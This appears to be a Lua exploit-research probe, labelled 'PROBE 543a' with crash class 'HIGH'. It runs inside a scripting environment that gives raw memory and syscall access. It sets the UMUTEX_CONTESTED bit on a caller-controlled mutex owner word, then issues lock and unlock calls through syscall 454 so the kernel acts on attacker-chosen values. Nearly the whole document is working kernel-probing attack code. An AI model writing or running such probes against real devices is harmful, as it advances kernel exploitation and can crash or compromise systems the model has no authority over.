-- CRASH_CLASS: HIGH
-- PROBE 543a: the caller-set contested bit on a plain mutex
--
-- Context: a umutex owner word carries UMUTEX_CONTESTED (0x80000000) in the
-- top bit. On a plain mutex the kernel trusts that bit and takes the contended
-- path, which allocates per-thread inheritance state and resolves the owner
-- from the word. The owner is entirely caller-controlled, so this is the
-- cheapest way to make the kernel act on a value we chose.
--
-- One case per run, mildest first: contested with owner 0, plain flags.

print("=== PROBE 543a: UMTX CONTESTED BIT ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a) return N(memory.read_dword(a)) end

local sc454 = mk(454)
local M = memory.alloc(0x40)

print("[1] pid=" .. tostring(N(make_pid and 0 or 0)))
wd(N(M) + 0, 0x80000000)
wd(N(M) + 4, 0)
wd(N(M) + 8, 0)
wd(N(M) + 12, 0)
print(string.format("[2] word=%08X flags=%08X", rd(N(M)), rd(N(M) + 4)))
local ret = -999
pcall(function()
    ret = N(sc454(uint64(N(M)), uint64(5), uint64(0), uint64(0), uint64(0)))
end)
print(string.format("[3] lock ret=%d word=%08X", ret, rd(N(M))))
local ret2 = -999
pcall(function()
    ret2 = N(sc454(uint64(N(M)), uint64(6), uint64(0), uint64(0), uint64(0)))
end)
print(string.format("[4] unlock ret=%d word=%08X", ret2, rd(N(M))))
print("=== DONE ===")
